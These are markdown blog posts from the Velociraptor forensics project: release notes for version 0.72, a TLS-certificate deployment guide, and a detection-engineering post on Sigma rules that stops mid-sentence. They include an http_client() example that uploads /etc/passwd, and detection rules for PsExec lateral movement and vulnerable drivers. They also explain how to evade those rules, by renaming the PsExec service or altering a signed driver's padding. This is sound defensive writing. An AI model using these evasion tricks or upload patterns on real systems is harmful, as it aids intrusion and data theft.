filter only those items. This made it cumbersome and inefficient to
review large numbers of groups.

In the latest release, stacking is built right into the GUI for fast
and efficient operation. I will demonstrate how to use it with the
example of the Velociraptor Sigma artifacts.

For this example, assume I approach a new endpoint and I really don't
know where to start - is this a suspicious endpoint? Is it normal?

First I will import the Sigma artifacts into my server. The
Velociraptor Sigma project maintains this artifact at
https://sigma.velocidex.com

![Importing the Sigma artifacts](importing_sigma.png)

I will import the `Velociraptor Hayabusa Ruleset` which allows me to
apply the rules maintained by the [Hayabusa
project](https://github.com/Yamato-Security/hayabusa) to static event
log files on the endpoint. The ruleset is extensive and rules are
broken down by rule level and rule status. However in this case I want
to try out all the rules - including very noisy ones because I want to
get an overview of what might have happened on this endpoint.

![Collecting the sigma artifact](collecting_sigma_rules.png)

The Hayabusa ruleset is extensive and might collect many false
positives. In this case it took around 6 minutes to apply the rules on
all the event log files and returned over 60k hits from about 4200
rules.

Generally it is impractical to review every single hit, so we
typically rely on Stacking the results using a query like

```vql
SELECT *, count() AS Count
FROM source(artifact="Windows.Hayabusa.Rules")
GROUP BY Title ORDER BY Count DESC
```

![Stacking rules by title](group_by.png)

We immediately see that almost half the rules are triggered by
informational DNS queries, but if we wanted to look at those we would
have to issue another query

```vql
SELECT *
FROM source(artifact="Windows.Hayabusa.Rules")
WHERE Title =~ "DNS Query"
```

In this release, stacking is built directly into the GUI making it a
lot easier to work with. The way this works is by performing the
stacking operation at the same time as sorting a column.

I will stack by Title by clicking the sort icon at the top of the column

![Stacking rules by title](stacking_a_column.png)

Once the column is sorted, a stacking icon will appear next to
it. Clicking on that icon will display the stacking dialog view. This
view shows the different unique values of the selected column and the
total number of items of that value. In our case it shows the total
number of times the specific rule has fired.

![Viewing the stacking stats](viewing_column_stack.png)

Clicking the icon in each row seeks the table immediately to view all
the rows with the same `Title` value. In this case I want to quickly
view the hits from the `Windows Defender Threat Detected` rule.

![Viewing the stacking stats](viewing_common_rows.png)

Using this technique I can quickly review the most interesting rules
and their corresponding hits directly in the GUI without needing to
recalculate anything.


### Undo/Redo for notebook cells

Velociraptor offers an easy way to experiment and explore data with
VQL queries in the notebook interface. Naturally exploring the data
requires going back and forth between different VQL queries.

In this release, Velociraptor keeps several versions of each VQL cell
(by default 5) so as users explore different queries they can easily
undo and redo queries. This makes exploring data much quicker as you
can go back to a previous version instantly.

![](undo-redo.png)

### Hunt view GUI is now paged

Previously hunts were presented in a table with limited size. In this
release, the hunt table is paged and searchable/sortable. This brings
the hunts table into line with the other tables in the interface and
allows an unlimited number of hunts to be viewable in the system.

![](hunt_table.png)

## Secret Management

Many Velociraptor plugins require secrets to operate. For example, the
`ssh` accessor requires a private key or password to log into the
remote system. Similarly the `s3` or `smb` accessors requires
credentials to upload to the remote file servers. Many connections
made over the `http_client()` plugin require authorization - for
example an API key to send `Slack` messages or query remote services
like `Virus Total`.

Previously plugins that required credentials needed those credentials
to be passed as arguments to the plugin. For example, the
[upload_s3()](https://docs.velociraptor.app/vql_reference/plugin/upload_s3/)
plugin requires AWS S3 credentials to be passed in as parameters.

This poses a problem for the Velociraptor artifact writer - how to
safely provide the credentials to the VQL query in a way that does not
expose them to every user of the Velociraptor GUI? If the credentials
are passed as parameters to the artifact then they are visible in the
query logs and request etc.

This release introduces `Secrets` as a first class concept within
VQL. A `Secret` is a specific data object (key/value pairs) given a
name which is used to configure credentials for certain plugins:

1. A Secret has a `name` which we use to refer to it in plugins.
2. Secrets have a `type` to ensure their data makes sense to the
   intended plugin. For example a secret needs certain fields for
   consumption by the `s3` accessor or the `http_client()` plugin.
3. Secrets are shared with certain users (or are public). This
   controls who can use the secret within the GUI.
4. The GUI is careful to not allow VQL to read the secrets
   directly. The secrets are used by the VQL plugins internally and
   are not exposed to VQL users (like notebooks or artifacts).

Let's work through an example of how Secrets can be managed within
Velociraptor. In this example we store credentials for the `ssh`
accessor to allow users to `glob()` a remote filesystem within the
notebook.

First I will select `manage server secrets` from the welcome page.

![](manage_secrets.png)

Next I will choose the `SSH PrivateKey` secret type and add a new
secret.

![](adding_new_secret.png)

This will use the secret template that corresponds to the SSH private
keys. The acceptable fields are shown in the GUI and a validation VQL
condition is also shown for the GUI to ensure that the secret is
properly populated. I will name the secret `DevMachine` to remind me
that this secret allows access to my development system. Note that the
hostname requires both the IP address (or dns name) and the port.

![](adding_new_secret_2.png)

Next I will share the secrets with some GUI users

![](edit_secret.png)

![](share_secret.png)

I can view the list of users that are able to use the secret within
the GUI

![](viewing_share_secret.png)

Now I can use the new secret by simply referring to it by name:

![](using_secret.png)

Not only is this more secure but it is also more convenient since we
don't need to remember the details of each secret to be able to use
it. For example, the `http_client()` plugin will fill the URL field,
headers, cookies etc directly from the secret without us needing to
bother with the details.

{{% notice "warning" %}}

Although `secrets` are designed to control access to the raw
credential by preventing users from directly accessing the secrets'
contents, those secrets are still written to disk. This means that GUI
users with direct filesystem access can simply read the secrets from
the disk.

We recommend not granting untrusted users elevated server permissions
like `EXECVE` or `Filesystem Read` as it can bypass the security
measures placed on secrets.

{{% /notice %}}


## Server improvements

### Implemented Websocket based communication mechanism

One of the most important differences between Velociraptor and some
older remote DFIR frameworks such as GRR is the fact that Velociraptor
maintains a constant, low latency connection to the server. This
allows Velociraptor clients to respond immediately without needing to
wait for polling on the server.

In order to enhance compatibility between multiple network
configurations, like MITM proxies, transparent proxies etc,
Velociraptor has stuck to simple HTTP based communications
protocols. To keep a constant connection, Velociraptor uses the long
poll method, keeping HTTP POST operations open for a long time.

However as the Internet evolves and newer protocols become commonly
used by major sites, the older HTTP based communication method has
proved more difficult to use. For example, we found that certain layer
7 load balancers interfere with the long poll method by introducing
buffering to the connection. This severely degrades communications
between client and server (Velociraptor falls back to a polling method
in this case).

On the other hand, modern protocols are more widely used, so we found
that modern load balancers and proxies already support standard low
latency communications protocol such as `Web Sockets`.

In this release, Velociraptor introduces support for websockets as a
communications protocol. The websocket protocol is designed for low
latency and low overhead continuous communications method between
clients and server (and is already used by e.g. most major social
media platforms). Therefore, this new method should be better
supported by network infrastructure as well as being more efficient.

To use the new websocket protocol, simply set the client's server URL
to have `wss://` scheme:

```yaml
Client:
  server_urls:
  - wss://velociraptor.example.com:8000/
  - https://velociraptor.example.com:8000/
```

You can use both `https` and `wss` URLs at the same time, Velociraptor
will switch from one to the other scheme if one becomes unavailable.

### Dynamic DNS providers

Velociraptor has the capability to adjust DNS records by itself (AKA
Dynamic DNS). This saves users the hassle of managing a dedicated
dynamic DNS service such as `ddclient`).

Traditionally we used Google Domains as our default Dynamic DNS
provider, but Google has decided to shut down this service abruptly
forcing us to switch to alternative providers.

The 0.72 release has now switched to `Cloudflare` as our default
preferred Dynamic DNS provider. We also added `noip.com` as a second
option.

Setting up Cloudflare as your preferred dynamic DNS provider requires
the following steps:

1. Sign into Cloudflare and buy a domain name.
2. go to https://dash.cloudflare.com/profile/api-tokens to generate an
   API token. Select `Edit Zone DNS` in the API Token templates.

![](cloudflare_1.png)

![](cloudflare_2.png)

You will require the "Edit" permission on Zone DNS and include the
specific zone name you want to manage. The zone name is the domain you
purchased for example "example.com". You will be able to set the
hostname under that domain, e.g. "velociraptor.example.com"

![](cloudflare_3.png)

Using this information you can now create the dyndns configuration:

```yaml
Frontend:
  ....
  dyn_dns:
    type: cloudflare
    api_token: XXXYYYZZZ
    zone_name: example.com
```

Make sure the Frontend.Hostname field is set to the correct hostname
to update - for example

```yaml
Frontend:
  hostname: velociraptor.example.com
```

This is the hostname that will be updated.

### Enhanced proxy support

Velociraptor is often deployed into complex enterprise networks. Such
networks are often locked down with complicated controls (such as MITM
inspection proxies or automated proxy configurations) which
Velociraptor needs to support.

Velociraptor already supports MITM proxies but previously had
inflexible proxy configuration. The proxy could be set or unset but
there was no finer grained control over which proxy to choose for
different URLs. This makes it difficult to deploy on changing
network topologies (such as roaming use).

The 0.72 release introduces more complex proxy condition
capabilities. It is now possible to specify which proxy to use for
which URL based on a set of regular expressions:

```yaml
Client:
  proxy_config:
    http: http://192.168.1.1:3128/
    proxy_url_regexp:
      "^https://www.google.com/": ""
      "^https://.+example.com": "https://proxy.example.com:3128/"
```

The above configuration means to:
1. By default connect to `http://192.168.1.1:3128/` for all URLs
   (including `https`)
2. Except for `www.google.com` which will be connecting to directly.
3. Any URLs in the `example.com` domain will be forwarded through
   `https://proxy.example.com:3128`

This proxy configuration can apply to the `Client` section or the
`Frontend` section to control the server's configuration.

Additionally, Velociraptor now supports a `Proxy Auto Configuration
(PAC)` file. If a `PAC` file is specified, then the other
configuration directives are ignored and all configuration comes from
the PAC file. The PAC file can also be read from disk using the
`file://` URL scheme, or even provided within the configuration file
using a `data:` URL.

```yaml
Client:
  proxy_config:
    pac: http://www.example.com/wpad.dat
```

Note that the PAC file must obviously be accessible without a proxy.

### Automated backups

Velociraptor maintains some critical metadata in various files. In
this release we implemented an automated backup and restore
framework. This framework is able to backup some critical parts of the
server using the VQL plugins [backup()]({{% ref
"/vql_reference/server/backup/" %}}) and [backup_restore()]({{% ref
"/vql_reference/server/backup_restore/" %}}), as well as periodically
(by default daily).

* Backup all users and ACLs
* Backup all hunt metadata
* Backup client metadata including labels, and other metadata.


## Other notable features

Other interesting improvements include

### Process memory access on MacOS

On MacOS we can now use proc_yara() to scan process memory. This
should work providing your TCT profile grant the `get-task-allow`,
`proc_info-allow` and `task_for_pid-allow` entitlements. For example
the following `plist` is needed at a minimum:

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.springboard.debugapplications</key>
    <true/>
    <key>get-task-allow</key>
    <true/>
    <key>proc_info-allow</key>
    <true/>
    <key>task_for_pid-allow</key>
    <true/>
</dict>
</plist>
```

### Multipart uploaders to http_client()

Sometimes servers requires uploaded files to be encoded using the
`mutipart/form` method.  Previously it was possible to upload files
using the `http_client()` plugin by constructing the relevant request
in pure VQL string building operations.

However this approach is limited by available memory and is not
suitable for larger files. It is also non-intuitive for users.

This release adds the `files` parameter to the `http_client()`
plugin. This simplifies uploading multiple files and automatically
streams those files without memory buffering - allowing very large
files to be uploaded this way.

For example:

```vql
SELECT *
FROM http_client(
  url='http://localhost:8002/test/',
  method='POST',
  files=dict(file='file.txt', key='file', path='/etc/passwd', accessor="file")
)
```

Here the files can be an array of dicts with the following fields:

* file: The name of the file that will be stored on the server
* key: The name of the form element that will receive the file
* path: This is an OSPath object that we open and stream into the form.
* accessor: Any accessor required for the path.

### Yara plugin can now accept compiled rules

The `yara()` plugin was upgraded to use Yara Version 4.5.0 as well as
support compiled yara rules. You can compile yara rules with the
`yarac` compiler to produce a binary rule file. Simply pass the
compiled binary data to the `yara()` plugin's `rules` parameter.

{{% notice "warning" %}}

We do not recommend using compiled yara rule because of their
practical limitations:

1. The compiled rules can not portable and must be used on exactly the
   same version of the yara library as the compiler that created them
   (Currently 4.5.0)
2. Compiled yara rules are much larger than the text rules.

Compiled yara rules pose no benefit over text based rules, except
perhaps being more complex to decompile. This is primarily the reason
to use compiled rules - to try to hide the rules (e.g. from commercial
reasons).

{{% /notice %}}

### The Registry Hunter is launched

As DFIR practitioners, the Windows registry is a treasure trove of
information. The Windows registry stores information about system
configuration and therefore we can use it to understand what software
was installed, how it was configured and hunt for mis-configuration or
deliberate compromises to achieve attacker persistence.

This release also introduces the Registry Hunter project - a unified
streamlined way to hunt for forensically relevant information through
the windows registry.

You can read more about [The registry hunter]({{% ref "/blog/2024/2024-04-12-registry-hunter/" %}}) in our blog post.

## Conclusions

There are many more new features and bug fixes in the latest release.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2024/2024-07-22-how-to-use-your-own-certificates/_index.md
======
---
title: "How to use your own certificates to secure your Velociraptor deployment"
description: |
    Velociraptor is a robust open-source tool designed for endpoint
    monitoring and digital forensics and response. Whether you deploy it
    on-premise or in the cloud, securing communication between the
    Velociraptor server and its clients is crucial. This blog post will
    guide you through creating and installing TLS certificates using
    DigiCert as your Certificate Authority (CA).

tags:
 - Deployment

author: "Chris Hayes"
date: 2024-07-16
---

This article was reproduced with permission from
[reliancecyber.com](https://reliancecyber.com/how-to-use-your-own-certificates-to-secure-your-velociraptor-deployment/). It
outlines some of the practical steps needed to deploy Velociraptor
with custom certificates and some step by step troubleshooting steps
that can be used to diagnose deployment issues.

## Using DigiCert as the certificate Authority

Velociraptor is a robust open-source tool designed for endpoint
monitoring and digital forensics and response.


## Introduction

Velociraptor is a robust open-source tool designed for endpoint
monitoring and digital forensics and response. Whether you deploy it
on-premise or in the cloud, securing communication between the
Velociraptor server and its clients is crucial. This blog post will
guide you through creating and installing TLS certificates using
DigiCert as your Certificate Authority (CA).

This guide has been written to provide additional guidance to the
following official Velociraptor articles.

[How do I use my own SSL certificates?](https://docs.velociraptor.app/knowledge_base/tips/ssl/)

[Velociraptor Security Configuration](https://docs.velociraptor.app/docs/deployment/security/).

## Prerequisites

Before getting started, ensure you have the following:

* *Domain name*: Own or control a domain name, such as example.com.
* *Accessible Velociraptor server*: Ensure your server is accessible via
  a domain name, e.g., DNS A record points to your Velociraptor
  server’s Public IP.
* *DigiCert* account: A valid SSL certificate from DigiCert for your domain.
* *OpenSSL*: Installed on your machine.


## Creating the certificate files

You will need three key files for the Velociraptor server:

* *Velociraptor.pem*: Contains the public certificate identifying your
  Velociraptor server.
* *your_domain_name.key*: Contains the private key for your SSL
  certificate. Keep this file secure.
* *CA_chain.pem*: Contains the certificate chain of your enterprise
  CA, including intermediate and root certificates.


DigiCert will provide the following files:

* *Private Key*: `your_domain_name.key`
* *Primary Certificate*: `your_domain_name.crt`
* *Intermediate Certificate*: `DigiCertCA.crt`
* *Root Certificate*: `TrustedRoot.crt`


For details on how to request your certificates [How do I Order a TLS/SSL Certificate? | DigiCert FAQ](https://www.digicert.com/faq/public-trust-and-certificates/how-do-i-order-a-tls-ssl-certificate)

## Creating Velociraptor.pem

To create the Velociraptor.pem file, you need to convert the Primary
Certificate (`your_domain_name.crt`) file from CRT to PEM format.

Open a terminal and run the following command:

```
openssl x509 -in your_domain_name.crt -out velociraptor.pem -outform PEM
```

Verify the certificate details:

```
openssl x509 -in velociraptor.pem -text -noout
```

You should see the details of your certificate, such as the issuer,
the subject, the validity period, and the public key.

## Verifying the key file

Ensure the private key (`your_domain_name.key`) is in PEM format and
decrypted. When viewed, the file should look like this:


```
-----BEGIN RSA PRIVATE KEY-----

    {base64 encoded data}

-----END RSA PRIVATE KEY-----
```

To verify that the key format is valid, run the following command:

```
openssl rsa -in your_domain_name.key -check
```

You should see `RSA key ok`.

## Creating CA_chain.pem

To create the CA_chain.pem file, you need to combine the intermediate
certificate (`DigiCertCA.crt`) and the root certificate
(`TrustedRoot.crt`) into one file. This can be done by simply
concatenating the two files using a text editor or a command line
tool. For example, you can run the following command:

```
cat DigiCertCA.crt TrustedRoot.crt > CA_chain.pem
```

{{% notice "note" %}}
Ensure the order is correct: server certificate first, followed by intermediate certificates (you may have more than one), and finally the root certificate.
{{% /notice %}}

You should now have the following files in your cert folder:

* *Velociraptor.pem* (contains only the server certificate)
* *your_domain_name.key* (contains the unencrypted private key)
* *CA_chain.pem* (contains the certificate chain of your enterprise CA)


## Configuring Velociraptor

To enable TLS encryption for the Velociraptor server and client:

### Generate a Self-Signed SSL Configuration:

```
./velociraptor-0.72.3-linux-amd64 config generate -i
```

**Note**: The version number may be different for the most recent release.


![The velociraptor configuration generator screenshot](Configuring-Velociraptor.png)


{{% notice "note" %}}

In this configuration I set frontend to communicate over port 443 as
most firewalls in a network will allow this traffic outbound making it
easier for the deployment of clients.

{{% /notice %}}

## Update the Server Configuration:

To use your own Certificates, you need to update the server
configuration file (`server.config.yaml`)

1. Locate the frontend section and add the `tls_certificate_filename`
   and `tls_private_key_filename` parameters (these are not included by
   default).

2. Enter the absolute path to these files. For testing, we placed them
   in /etc, but you may want to use a different location for
   production use.

```yaml
Frontend:

  tls_certificate_filename: /etc/velociraptor.pem

  tls_private_key_filename: /etc/your_domain_key.key
```

![Configuring server update Velociraptor](Configuring-server-update-Velociraptor.png)

## Update the client configuration:

**Note**: if you have already exported a `client.config.yaml`, then you
need to update the client section in both `server.config.yaml`
configuration file and the `client.config.yaml` configuration
file. Remember, the client configuration is embedded into the server
configuration file, so you need to update it there as well.

1. In the client section, modify `use_self_signed_ssl` to be
   **false**. This will tell the client to use the CA certificate instead
   of the server certificate for verification.

2. Copy and paste the CA root and intermediate certificates (created
   in the `CA_chain.pem` file) to the `root_certs` parameter. This will
   allow the client to trust the CA certificate chain. For example:

```yaml
use_self_signed_ssl: false
Crypto:
    root_certs: |
         -----BEGIN CERTIFICATE-----
         The Intermediate Certificate

         -----END CERTIFICATE-----

         -----BEGIN CERTIFICATE-----

            The Root Certificate

         -----END CERTIFICATE-----
```

{{% notice "note" %}}

As discussed in the certificate section, ensure that the intermediate
and root certificates are in the correct order. The server certificate
should come first, followed by any intermediate certs, and finally the
root trusted authority certificate (if self-signed) for more
information, please see
https://www.rfc-editor.org/rfc/rfc4346#section-7.4.2

{{% /notice %}}

## Testing the TLS Encryption

To verify the TLS encryption:

* **GUI**: Launch the Velociraptor server and connect to the GUI using
  your web browser. You should be able to access the GUI using the new
  certificate. You may need to trust the certificate in your browser
  or system to prevent errors.

* **Frontend**: Launch the Velociraptor client and check the logs for
  any errors. The client should connect securely to the server using
  the trusted CA chain and the new server certificate.

* No changes need to be made to the pinned certificate name, nor do
  any certificates need to be modified in the configuration files.


## Troubleshooting

### Connection/certificate errors:

To validate that the certificates you are using are in the right
format, you can use the command to diagnose issues:

```
openssl [x509|rsa] -in CERT_FILE -text -noout
```

If the certificates are in the right format and valid you should use
curl to confirm connectivity by requesting the `server.pem` file from
the velociraptor server (as detailed in [Troubleshooting and
Debugging](https://docs.velociraptor.app/docs/deployment/troubleshooting/)).

### Use curl from the server localhost

```
curl https://localhost/server.pem -vvv
```

**Reason**: This command tests the server’s ability to serve the
certificate file (`server.pem`) over HTTPS from the local machine. Using
the `-vvv` flag enables verbose output, providing detailed information
about the connection process, including SSL/TLS handshake details. It
helps to confirm that:

1. **Local Server Configuration**: The server is properly configured to
   handle HTTPS requests.
2. **Certificate Availability**: The certificate file is accessible and
   correctly served by the server.

### Use curl from the server localhost allowing self-signed certificates

```
curl https://localhost/server.pem -vvv -k
```

**Reason**: This command includes the -k option, which allows
connections to servers using self-signed certificates. It helps to:

1. **Bypass SSL Verification**: Ensure that the server can still serve the
   certificate even when SSL verification is bypassed. This is useful
   for testing purposes when using self-signed certificates.

2. **Debugging**: Identify issues related to SSL verification failures
   that might not be apparent when SSL verification is enforced.


### Use  curl from the localhost via DNS

```
curl https://www.example.com/server.pem -vvv
```

**Reason**: Running this command from the localhost but using the
domain name tests:

1. **DNS Resolution**: Ensure that the domain name resolves correctly to the local server.
2. **SSL/TLS Configuration**: Confirm that the server is correctly serving the certificate over the domain name.

### Use curl from a remote client

```
curl https://www.example.com/server.pem -vvv
```

**Reason**: This command tests the following from a remote client (a
different machine than the server):

1. **External Connectivity**: Ensure that the server is accessible over
   the internet or network and that there are no firewall or network
   issues preventing access.
2. **SSL/TLS Configuration**: Confirm that the SSL/TLS setup is correct
   and the server is properly serving the certificate to external
   clients.
3. **Certificate Acceptance**: Verify that the client can accept and
   validate the certificate, ensuring the trust chain is correctly
   established.

These steps validate the entire communication path, from local server
configuration to remote client connectivity.

## Proxy Errors:

A proxy or SSL inspection device is a network device that inspects and
modifies the traffic between the client and the server. Sometimes
these devices can cause problems, especially if they are not
configured properly or are incompatible with the server’s TLS version
or cipher suite.

One possible error is this Server reports:

> http: TLS handshake error from XX.XX.XX.XX: :22439 read tcp XX.XX.XX.XX:443-> XX.XX.XX.XX:22439: read: connection reset by peer


This means the server-client TLS connection was interrupted. This
could be due to network issues, firewall settings, or expired
certificates.

Another possible error reported by the client:

> wsarecv: An existing connection was forcibly closed by the remote host.

This means the server or something in between closed the connection
abruptly. This could be due to server overload, crash, or shutdown, or
a proxy or SSL inspection device that interferes with the connection.

To check if there is a proxy or SSL inspection device that is causing the connection errors, run this command:

```
curl https[://]server.com/server.pem -vvv
```

This command tries to download the server’s certificate file using
curl. If the command succeeds, there is no proxy or SSL inspection
device that is blocking or altering the connection. If the command
fails or idles, there is something in between that is preventing or
delaying the connection.

If you suspect that there is a proxy or SSL inspection device that is
causing the connection errors, try these solutions:

* Review the configurations of the proxy or SSL inspection device and
  make sure they are compatible with the server’s TLS version and
  cipher suite. You can use tools like `SSL Labs` or `TestSSL` to check
  the server’s TLS configuration and compare it with the proxy or SSL
  inspection device.
* Disable or bypass the proxy or SSL inspection device temporarily and
  see if the connection errors go away. This can help you isolate the
  problem and confirm that the proxy or SSL inspection device is the
  culprit.
* Contact the administrator or vendor of the proxy or SSL inspection
  device and ask for help or guidance on how to resolve the
  issue. They might have some tips or updates that can fix the
  problem.

For full details on troubleshooting or for any other debugging issues,
please see [Troubleshooting and Debugging](https://docs.velociraptor.app/docs/deployment/troubleshooting/)

## About the author

![Picture of Chris Hayes - Head of IR](Untitled-design-5-e1721652417163.png)

### Chris Hayes, Head of Incident Response at Reliance Cyber

Chris possesses over 10 years of experience across a series of Cyber roles within both the private public sector. As ex-military, Chris has responded to some of the largest and most high-profile cyber-attacks in addition to tracking sophisticated nation state threat actor groups.

---END OF FILE---

======
FILE: /content/blog/2024/2024-05-09-detection-engineering/_index.md
======
---
title: "Detection Engineering"
description: |
    As defenders, we rely on effective detection capabilities.

date: 2024-05-08T23:25:17Z
draft: false
weight: 40
tags:
  - Sigma
  - Detection
---

{{% notice note "" %}}

This post accompanies the presentation [Advances in Detection Engineering](https://present.velocidex.com/presentations/2024-auscert-detection_engineering/index.html) presented at the annual [Auscert 2024 Conference](https://conference.auscert.org.au/program/) on the 24th May 2024

{{% /notice %}}


As defenders, we rely on having an efficient and effective detection
capabilities so we can shut down attacks quickly before the damage is
done. To do this effectively, defenders rely on automated detection,
driven by specific rules. While there are many detection platforms
available with different ways of writing rules, there is a lot of
commonality in the type of rules that are needed for effective
detection - this new discipline is called "Detection Engineering".

## What is Detection Engineering?

While intrusion detection systems and tools have always been in use in
the enterprise space, it has only been a recent realization that tools
alone are not sufficient for effective detection. Organizations must
dedicate resources and expertise to specialists in tuning and
architecting effective detection system.

The discipline of `Detection Engineering` is a science of writing,
maintaining and testing detection rules and systems against an
evolving threat landscape. It is now considered an important integral
part for an effective and mature security program.

This blog post discusses some of the challenges in testing and
maintaining detection rules, specifically Sigma rules. We also cover
some emerging scenarios where detection engineering can be employed,
such as in Forensic Triage and wider Threat Hunting.

## Traditional SIEM based detection

Traditionally detection focuses on event logs as the main source of
information. Event logs are parsed and shipped from the endpoints to a
central data mining server where queries are run over the data.

For example, using the ELK stack, the Winlogbeats endpoint agent:

1. Parses certain raw event logs on the endpoint (For example Sysmon
   event log)

2. Applies normalization of fields (mostly renaming fields) to the
   Elastic Common Schema (ECS).

3. Forwards events to an Elastic Cluster.

4. Queries are run on the Elastic cluster using a specialized query
   language to detect anomalies.

Other stacks collect different sources, implement different
normalization process and have different query languages and dialects.

When comparing various detection technologies we can see that although
the basic principals are similar (collect logs, normalize logs into a
schema, forward to data mining system and then query the data) the
specifics are very different.

![](edr_env.svg)

## The Sigma Rule format

Because each system is different, it is difficult to exchange
detection rules within the community. For example an Elastic query
might apply to those running the ELK stack but will not be applicable
to those running Splunk or another system.

The `Sigma` standard was designed to try to address the situation by
creating another layer of abstraction over the actual detection stack,
in order to facilitate rule exchange. The hope is that rules can be
immediately usable across different detection stacks.

This is achieved by defining an abstract YAML based format for writing
detection rules. These rules are then fed to specialized `Sigma
Compilers` to produce stack specific queries for difference SIEM
vendors.

![](sigma_architecture.svg)

Sigma addresses the differences between the detection stacks by
introducing abstractions at various levels:

* The differences in internal Schema normalization is addressed by
  abstracting field names. Rather than selecting a standard, well
  defined taxonomy of field names, Sigma leaves the precise fields
  allowed within a rule to the Sigma Compiler `Field Mapping`
  configuration.

* Different detection stacks collect different event logs. However,
  instead of specifying the precise event logs a rule applies to,
  Sigma defines an abstract `log source` which is mapped to the
  concrete source using the Sigma Compiler's `Log Source Mappings`.

This lack of rigorous definitions leads to inaccuracies and
compatibility problems as we shall see shortly, however let's first
examine a typical `Sigma Rule`:

```yaml
logsource:
    category: process_creation
    product: windows
detection:
    process_creation:
        EventID: 4688
        Channel: Security
    selection:
        -   CommandLine|contains|all:
                - \AppData\Roaming\Oracle
                - \java
                - '.exe '
        -   CommandLine|contains|all:
                - cscript.exe
                - Retrive
                - '.vbs '
    condition: process_creation and selection
```

### Log sources

Sigma rules are written to target certain events from particular log
sources. The Sigma rule specifies the log source in the `logsource`
section, breaking it by category, product and service etc.

This example rule specifies that it applies on events collected from
the `process_creation` log. But what does `process_creation` mean
exactly?  The [Sigma
documentation](https://sigmahq.io/docs/basics/log-sources.html) doesn't
really specify what that means.

Typically we can get process creation information for various sources,
for example `Sysmon Event ID 1` is a common source of process
creation. Similarly the Windows `Security Log` generates `Event ID
4688`. Of course we could always forward events from a local EDR or
other security software which records process execution, but the
rule's `logsource` section does not specify precisely what the event
log actually is.

### Field mappings

The above rule specifies a `detection` section. This section consists
of a condition which when satisfied, causes the rule to fire. The
above rule compares the command line to a number of strings. The rule
refers to the command line using the `CommandLine` field.

In practice, the event itself consists of various fields, but the
exact name of each field depends on the data normalization that takes
place at the sensor level. For example Elastic Common Schema
[normalizes](https://www.elastic.co/guide/en/ecs/current/ecs-process.html#field-process-command-line)
the `CommandLine` field to `process.command_line` in the ECS Schema.

Therefore `Sigma` uses a target-specific translation between abstract
Sigma fields to the actual field in the event record in the target
SIEM. This translation is called `Field Mapping` and depends on the
target detection stack used and its event normalization (and to some
extent its own configuration).

### Using Sigma Rules effectively

When using `Sigma rules` in practice, there are many false
positive. Usually the rules need to be tailored for the
environment. For example, in some environments running `PsExec` is a
common practice between system administrators and so alerting on
lateral movement using `PsExec` is going to be a false positive.

The detection engineer's main challenge is to understand what rules
can be ignored and how they can be bypassed. This takes a lot of
practice and experience.

Consider the following [Sigma
rule](https://github.com/Yamato-Security/hayabusa-rules/blob/dfcce330da37d49610f63f7923ba54dc5d930c9a/hayabusa/builtin/System/Sys_7045_Med_LateralMovement-PSEXEC.yml)
excerpt:

```yaml
title: PSExec Lateral Movement
logsource:
    product: windows
    service: system
detection:
    selection:
        Channel: System
        EventID: 7045
    selection_PSEXESVC_in_service:
        Service: PSEXESVC
    selection_PSEXESVC_in_path:
        ImagePath|contains: PSEXESVC
    condition: selection and (selection_PSEXESVC_in_service or selection_PSEXESVC_in_path)
```

This rule detects when a new service is created with the name
`PSEXESVC` or a service is created with that name included in the path.
While this is the default behavior of `PsExec` it is trivial to bypass this
rule. Viewing the [PsExec
Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
we can see that the `-r` flag can change this service name to anything
while the filename itself can be changed as well.

An experienced detection engineer will recognize that better telemetry
can help detect when a program is renamed by using the
`OriginalFileName` field from Sysmon's process execution logs with [the following rule](https://github.com/SigmaHQ/sigma/blob/6412c1a02bb60e631c6d341f6fc41d6f3c507f98/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml) excerpt:

```yaml
title: Potential Defense Evasion Via Rename Of Highly Relevant Binaries
author: Matthew Green - @mgreen27, Florian Roth (Nextron Systems), frack113
logsource:
    category: process_creation
    product: windows
detection:
    selection:
      - Description: 'Execute processes remotely'
      - Product: 'Sysinternals PsExec'
      - OriginalFileName:
          - 'psexec.exe'
```

This is an excellent example where additional information (in the form
of the executable's `VersionInformation` resource) gathered from the
endpoint can help improve detection efficiency significantly. We will
see below how adding more details to the collected data (perhaps
beyond the event log itself) can vastly improve the quality and
fidelity of detection rules.

As a second example, let's explore the use of hashes in detection
rules. Consider the [following
rule](https://github.com/SigmaHQ/sigma/blob/6412c1a02bb60e631c6d341f6fc41d6f3c507f98/deprecated/windows/driver_load_win_vuln_lenovo_driver.yml)
excerpt which detects the loading of a known vulnerable driver:

```yaml
title: Vulnerable Lenovo Driver Load
author: Florian Roth (Nextron Systems)
logsource:
    category: driver_load
        product: windows
detection:
    selection_sysmon:
        Hashes|contains:
        - 'SHA256=F05B1EE9E2F6AB704B8919D5071BECBCE6F9D0F9D0BA32A460C41D5272134ABE'
        - 'SHA1=B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F'
        - 'MD5=B941C8364308990EE4CC6EADF7214E0F'
    selection_hash:
        - sha256: 'f05b1ee9e2f6ab704b8919d5071becbce6f9d0f9d0ba32a460c41d5272134abe'
        - sha1: 'b89a8eef5aeae806af5ba212a8068845cafdab6f'
        - md5: 'b941c8364308990ee4cc6eadf7214e0f'
    condition: 1 of selection*
```

Attackers often load vulnerable drivers so they can exploit them to
gain access to kernel space. While it is well known that hashes are
usually a weak signal (because the attacker can trivially change the
file) in the case of loaded drivers, the driver must be signed to be
successfully inserted into the kernel.

This had led to a misconception that driver files cannot be
modified - otherwise their digital signature will be invalidated
making them unable to be loaded into the kernel.

Unfortunately this is not true - a signed binary file
can easily be modified in such as a way that it's authenticode hash
(which is signed) remains the same but its file hash changes. This is
because a file hash covers the entire file, while the authenticode
hash only covers selected regions of the binary. It is very easy to
modify a binary in those regions which are not covered by the
authenticode hash (usually some padding areas towards the end of the
file) while retaining its authenticode hash.

An experienced detection engineer is aware of this shortcoming and
